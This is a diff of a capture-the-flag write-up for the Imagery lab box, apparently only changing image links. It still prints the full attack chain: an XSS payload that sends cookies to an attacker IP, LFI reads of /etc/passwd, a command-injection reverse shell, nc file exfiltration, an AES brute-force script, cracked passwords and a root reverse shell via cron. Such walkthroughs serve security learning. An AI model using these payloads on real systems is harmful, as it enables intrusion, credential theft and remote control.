@@ -23,17 +23,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Port 8000
-![[Pasted image 20251209183946.png]]
+![Pasted image 20251209183946](../Attachments/Pasted%20image%2020251209183946.png)
 - can register as : `test@test.com:test`
-![[Pasted image 20251209184014.png]]
+![Pasted image 20251209184014](../Attachments/Pasted%20image%2020251209184014.png)
 - I login to find an image upload website
-![[Pasted image 20251209184047.png]]
+![Pasted image 20251209184047](../Attachments/Pasted%20image%2020251209184047.png)
 
 - Report feature. Maybe an admin would open this and we can do an xss payload.
 ```
 <img src=x onerror="document.location='http://10.10.14.21/surprise/'+document.cookie">
 ```
-![[Pasted image 20251209200216.png]]
+![Pasted image 20251209200216](../Attachments/Pasted%20image%2020251209200216.png)
 - I grab the admin's cookie on my listener:
 ```
 nc -lvnp 80
@@ -52,10 +52,10 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 ```
 - I input the admin cookie in my browser and I get a (kind of broken) admin panel. Note that we need to have our listener on for it to work:
-![[Pasted image 20251209200313.png]]
-![[Pasted image 20251209200713.png]]
+![Pasted image 20251209200313](../Attachments/Pasted%20image%2020251209200313.png)
+![Pasted image 20251209200713](../Attachments/Pasted%20image%2020251209200713.png)
 - I click on testuesr's log and find an unusual url:
-![[Pasted image 20251209200738.png]]
+![Pasted image 20251209200738](../Attachments/Pasted%20image%2020251209200738.png)
 - I test for LFI and grab `/etc/passwd`:
 ```
 http://imagery.htb:8000/admin/get_system_log?log_identifier=/../../../../../etc/passwd
@@ -64,30 +64,30 @@ http://imagery.htb:8000/admin/get_system_log?log_identifier=/../../../../../etc/
 ```
 cat ~/Downloads/passwd | grep "/bin/bash"
 ```
-![[Pasted image 20251209200846.png]]
+![Pasted image 20251209200846](../Attachments/Pasted%20image%2020251209200846.png)
 - Now we need to enumerate the target.
 - Looking at `proc/self/environ` we get some more ifnormation:
-![[Pasted image 20251209203238.png]]
+![Pasted image 20251209203238](../Attachments/Pasted%20image%2020251209203238.png)
 
 - I notice `flaskapp.service`
 - I also see path: `PATH=/home/web/web/env/bin:/sbin:/usr/bin`
 - Using this I can first see what config files are there for flask:
 - A quick look at flask repo shows some files like `config.py` and `app.py`
-![[Pasted image 20251209203527.png]]
+![Pasted image 20251209203527](../Attachments/Pasted%20image%2020251209203527.png)
 
 - I search them and get outputs. Importantly in config.py
-![[Pasted image 20251209203658.png]]
+![Pasted image 20251209203658](../Attachments/Pasted%20image%2020251209203658.png)
 
 - This calls db.json which I find too holding md5 password of users from which i crack `testuser@imagery.htb:iambatman`
-![[Pasted image 20251209203755.png]]
+![Pasted image 20251209203755](../Attachments/Pasted%20image%2020251209203755.png)
 - Alternatively can download db.json via url
 ```
 http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json
 ```
-![[Pasted image 20251209203821.png]]
+![Pasted image 20251209203821](../Attachments/Pasted%20image%2020251209203821.png)
 
 - Here if we also search for `api_edit.py` we will find the critical vulnerability. A hint could be we see imagick checks in config file:
-![[Pasted image 20251209204009.png]]
+![Pasted image 20251209204009](../Attachments/Pasted%20image%2020251209204009.png)
 ```
 if transform_type == 'crop':
             x = str(params.get('x'))
@@ -100,14 +100,14 @@ if transform_type == 'crop':
 ```
 {"imageId":"00b2b849-68ac-4024-8f69-df19e6eb4caf","transformType":"crop","params":{"x":"0`id`","y":0,"width":2466,"height":2463}}
 ```
-![[Pasted image 20251209205000.png]]
+![Pasted image 20251209205000](../Attachments/Pasted%20image%2020251209205000.png)
 - I enclosed x in quotes and found backtick causes a bash error. i then executed commands inside the backtick and enclosed the whole thing in quotes and i seem to be getting outputs.
 - So I execute my reverse shell here:
 ```
 {"imageId":"00b2b849-68ac-4024-8f69-df19e6eb4caf","transformType":"crop","params":{"x":"0`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.21 9999 >/tmp/f`","y":0,"width":2466,"height":2463}}
 ```
 - I grab a shell as user web:
-![[Pasted image 20251209205417.png]]
+![Pasted image 20251209205417](../Attachments/Pasted%20image%2020251209205417.png)
 - Looking at linpeas I find an unusual backup file in `/var/backups` with a `.aes` ending. I grab the file and send it to my local machine with nc
 ```
 #Target
@@ -124,7 +124,7 @@ file web.aes
 ---OUTPUT---
 web.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
 ```
-![[Pasted image 20251209220414.png]]
+![Pasted image 20251209220414](../Attachments/Pasted%20image%2020251209220414.png)
 
 - I can decrypt it with a bruteforce script using the rockyou wordlist:
 ```
@@ -154,7 +154,7 @@ with open(wordlist, "r", errors="ignore") as f:
     else:
         print("\n[-] Password not found in wordlist.")
 ```
-![[Pasted image 20251209220440.png]]
+![Pasted image 20251209220440](../Attachments/Pasted%20image%2020251209220440.png)
 - I analyze the decrypted file to find its a zip archive:
 ```
 file web.dec 
@@ -162,18 +162,18 @@ file web.dec
 ---OUTPUT---
 web.dec: Zip archive data, at least v2.0 to extract, compression method=deflate
 ```
-![[Pasted image 20251209220336.png]]
+![Pasted image 20251209220336](../Attachments/Pasted%20image%2020251209220336.png)
 
 - I unzip it
 ```
 unzip web.dec
 ```
 - In `db.json` I find user mark's hash which i decrypt in crackstation.net to be `supersmash`
-![[Pasted image 20251209220655.png]]
+![Pasted image 20251209220655](../Attachments/Pasted%20image%2020251209220655.png)
 
-![[Pasted image 20251209220620.png]]
+![Pasted image 20251209220620](../Attachments/Pasted%20image%2020251209220620.png)
 
-![[Pasted image 20251209220715.png]]
+![Pasted image 20251209220715](../Attachments/Pasted%20image%2020251209220715.png)
 
 - I switch to mark user
 ```
@@ -182,7 +182,7 @@ su mark
 ```
 
 - I grab user flag:
-![[Pasted image 20251209220847.png]]
+![Pasted image 20251209220847](../Attachments/Pasted%20image%2020251209220847.png)
 
 - I check sudo privileges and find something interesting
 ```
@@ -192,25 +192,25 @@ sudo -l
 User mark may run the following commands on Imagery:
     (ALL) NOPASSWD: /usr/local/bin/charcol
 ```
-![[Pasted image 20251209220941.png]]
+![Pasted image 20251209220941](../Attachments/Pasted%20image%2020251209220941.png)
 
 - I run the command with sudo where it prompts me to either use the `help` or `shell` argument. I am unable to use the shell argument as it asks for a Master Password which i don't have 
-![[Pasted image 20251209221050.png]]
+![Pasted image 20251209221050](../Attachments/Pasted%20image%2020251209221050.png)
 
 - I then check the `help` command which says I can reset the password with `mark`'s system pwd:
-![[Pasted image 20251209221151.png]]
+![Pasted image 20251209221151](../Attachments/Pasted%20image%2020251209221151.png)
 
 - I reset the password and on next entry simply press enter to set no password
-![[Pasted image 20251209221307.png]]
+![Pasted image 20251209221307](../Attachments/Pasted%20image%2020251209221307.png)
 
 - Finally I can reach the shell:
-![[Pasted image 20251209221406.png]]
+![Pasted image 20251209221406](../Attachments/Pasted%20image%2020251209221406.png)
 
 - Checking the `help` command there is an auto cron job command I can execute. I can pass this command to get a shell on my listener as `root`:
 ```
 auto add --schedule "* * * * *" --command "bash -c 'bash -i >& /dev/tcp/10.10.14.21/9999 0>&1'" --name "root"
 ```
 
-![[Pasted image 20251209221846.png]]
+![Pasted image 20251209221846](../Attachments/Pasted%20image%2020251209221846.png)
 - I grab root flag:
-![[Pasted image 20251209221931.png]]
+![Pasted image 20251209221931](../Attachments/Pasted%20image%2020251209221931.png)
